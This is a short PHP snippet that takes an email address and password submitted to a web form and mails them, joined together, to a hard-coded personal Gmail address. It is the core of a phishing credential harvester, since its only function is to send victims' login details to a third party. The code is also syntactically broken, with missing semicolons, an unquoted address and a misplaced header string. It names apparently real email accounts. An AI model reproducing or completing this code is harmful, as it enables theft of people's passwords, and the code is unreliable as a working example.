$email = $_REQUEST['email']
$password = $_REQUEST['password']

if (empty($email) || empty($password))
{
    echo("Please enter in the required fields");
}
else
{
    mail(soniaballa1998@gmail.com,"Contact",$email.$password)."From: testername123456@gmail.com";
}